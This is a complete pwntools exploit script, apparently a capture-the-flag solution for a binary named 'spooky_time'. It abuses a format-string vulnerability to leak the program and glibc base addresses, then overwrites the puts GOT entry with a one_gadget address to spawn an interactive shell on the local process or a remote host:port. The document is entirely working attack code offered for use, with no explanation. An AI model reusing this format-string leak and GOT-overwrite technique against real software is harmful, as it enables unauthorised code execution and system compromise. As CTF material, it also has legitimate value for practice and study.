#!/usr/bin/env python3

from pwn import context, ELF, fmtstr_payload, log, remote, sys

context.binary = elf = ELF('spooky_time')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b"It's your chance to scare those little kids, say something scary!\n\n", b'%51$p.%69$p')
    p.recvuntil(b'Seriously?? I bet you can do better than \n')
    leaks = p.recvline().decode().split('.')

    main_addr = int(leaks[0], 16)
    __libc_start_main_addr = int(leaks[1], 16) - 128

    elf.address = main_addr - elf.sym.main
    glibc.address = __libc_start_main_addr - glibc.sym.__libc_start_main

    log.success(f'ELF base address: {hex(elf.address)}')
    log.success(f'Glibc base address: {hex(glibc.address)}')

    one_gadgets = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]

    payload = fmtstr_payload(8, {elf.got.puts: glibc.address + one_gadgets[1]})

    p.sendlineafter(b"Anyway, here comes another bunch of kids, let's try one more time..\n\n\n", payload)

    p.recv()
    p.interactive()


if __name__ == '__main__':
    main()
